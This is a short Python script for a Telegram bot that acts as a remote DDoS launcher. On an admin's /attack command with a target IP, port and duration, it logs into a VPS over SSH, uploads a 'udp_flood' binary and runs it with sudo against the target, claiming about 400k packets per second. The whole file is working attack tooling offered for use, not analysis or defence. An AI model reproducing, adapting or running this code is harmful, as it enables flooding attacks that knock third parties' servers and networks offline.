import telebot
import paramiko
import os

BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID'))
VPS_HOST = os.getenv('VPS_HOST')
VPS_USER = os.getenv('VPS_USER')
VPS_PASS = os.getenv('VPS_PASS')
LOCAL_BINARY_PATH = 'udp_flood'
REMOTE_BINARY_PATH = '/home/root/udp_flood'

bot = telebot.TeleBot(BOT_TOKEN)
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def connect_vps():
    ssh.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS)

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Unauthorized.")
        return
    bot.reply_to(message, "UDP Flood Bot ready. Use /attack <ip> <port> <duration_sec>")

@bot.message_handler(commands=['attack'])
def attack(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Unauthorized.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "Usage: /attack <ip> <port> <duration_sec>")
            return
        target_ip, target_port, duration = parts[1], int(parts[2]), int(parts[3])

        connect_vps()

        sftp = ssh.open_sftp()
        sftp.put(LOCAL_BINARY_PATH, REMOTE_BINARY_PATH)
        sftp.close()

        cmd = f"sudo timeout {duration}s ./{os.path.basename(REMOTE_BINARY_PATH)} {target_ip} {target_port} {duration}"
        stdin, stdout, stderr = ssh.exec_command(cmd)
        output = stdout.read().decode()
        error = stderr.read().decode()

        ssh.close()

        if error:
            bot.reply_to(message, f"Attack started but error: {error}")
        else:
            bot.reply_to(message, f"Attack on {target_ip}:{target_port} for {duration}s launched (~400k pps). Output: {output}")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

if __name__ == '__main__':
    bot.polling()
